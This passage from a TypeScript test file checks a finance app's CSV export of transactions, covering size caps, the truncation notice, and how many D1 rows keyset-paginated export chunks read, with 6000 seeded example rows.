    expect(bytes.length).toBeLessThanOrEqual(EXPORT_MAX_BYTES + EXPORT_CHUNK_BYTES + 1000)
    expect(rows.at(-1)![column('Description')]).toBe(`EXAMPLE ROW ${rows.length}`)
    expect(records.at(-1)).toEqual([`Only the first ${rows.length.toLocaleString('en-NZ')} Transactions are in this file, and more match. The totals cover only those. Narrow the dates or filters, then export again.`])
    expect(records).toContainEqual(['Transactions', String(rows.length)])
    expect(watched.prepared).toBeLessThanOrEqual(8)
  })
})

describe('what a request reads from D1', () => {
  // ADR 0004: D1 Free bills rows read (5 million a day). The export pages by (date, id), never OFFSET, so reading all of it costs a
  // few reads for each Transaction exported, however far into the history a chunk is; and a date range reads only its dates.
  // Some Transactions have an Override, some a Rule's Category, some both and some neither: each Category source that supplies one is a read.
  const TRANSACTIONS = 6000
  beforeEach(async () => {
    const [fuel, groceries] = [await addCategory('Fuel'), await addCategory('Groceries')]
    await env.DB.prepare(
      `WITH RECURSIVE seq(i) AS (SELECT 1 UNION ALL SELECT i + 1 FROM seq WHERE i < ${TRANSACTIONS})
       INSERT INTO transactions (account_id, date, amount_cents, description, source, override_category, rule_category)
       SELECT CASE WHEN i % 2 = 0 THEN ?1 ELSE ?2 END, date('2020-01-01', '+' || (i / 4) || ' days'), -100, 'EXAMPLE ROW ' || i, 'import',
              CASE WHEN i % 4 IN (0, 2) THEN ?3 END, CASE WHEN i % 4 IN (1, 2) THEN ?4 END FROM seq`,
    )
      .bind(savings, cheque, fuel, groceries)
      .run()
  })

  /** Reads the whole export the way the route does, one chunk after another, and totals the rows D1 says it read. */
  async function readAll(filters: Parameters<typeof exportChunk>[0]) {
    let after = { date: '', id: 0 }
    let rowsRead = 0
    let rows = 0
    for (;;) {
      const { sql, binds } = exportChunk(filters, after, EXPORT_CHUNK_ROWS)
      const result = await env.DB.prepare(sql).bind(...binds).all<Chunk>()
      rowsRead += (result.meta as { rows_read: number }).rows_read
      const chunk = result.results[0]!
      rows += chunk.n
      if (chunk.fetched < EXPORT_CHUNK_ROWS && chunk.n === chunk.fetched) return { rows, rowsRead }
      after = chunkEnd(chunk)
    }
  }

  // Three reads for each: its place in the date index, the row itself and its Account; one more for each Category source that
  // supplies its Category (one on average here); and three more for the sort that the window sizing a chunk needs. Paging with
  // OFFSET would add the rows skipped each time, about another 12 a row by the end of this history.
  it('reads each Transaction about seven times, for the whole history', async () => {
    const { rows, rowsRead } = await readAll({ uncategorised: false })
    expect(rows).toBe(TRANSACTIONS)
    expect(rowsRead).toBeLessThanOrEqual(TRANSACTIONS * 7 + 100)
  })

  it('reads only the dates asked for, with or without an Account', async () => {
    for (const accountId of [undefined, cheque]) {
      const { rows, rowsRead } = await readAll({ uncategorised: false, accountId, from: '2021-03-01', to: '2021-03-31' })
      expect(rows).toBeGreaterThan(0)
      expect(rowsRead).toBeLessThanOrEqual(rows * 7 + 100)
    }
  })
})
